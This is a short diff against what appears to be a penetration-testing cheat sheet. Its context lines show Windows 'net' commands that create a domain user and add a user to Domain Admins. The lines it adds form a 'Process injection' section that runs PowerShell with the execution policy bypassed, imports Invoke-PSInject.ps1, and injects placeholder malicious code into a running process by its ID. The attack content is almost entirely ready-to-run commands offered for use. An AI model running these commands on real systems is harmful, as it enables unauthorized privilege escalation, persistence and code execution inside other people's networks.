@@ -282,3 +282,10 @@ or more in metasploit...
 net user test2 password /add /domain
 net group "Domain Admins" fcastle /ADD /DOMAIN
 ```
+
+### Process injection :
+```bash
+powershell -ep bypass
+Import-Module .\Invoke-PSInject.ps1
+Invoke-PSInject -ProcId 2792 -PoshCode "<malicious C# code>"
+```
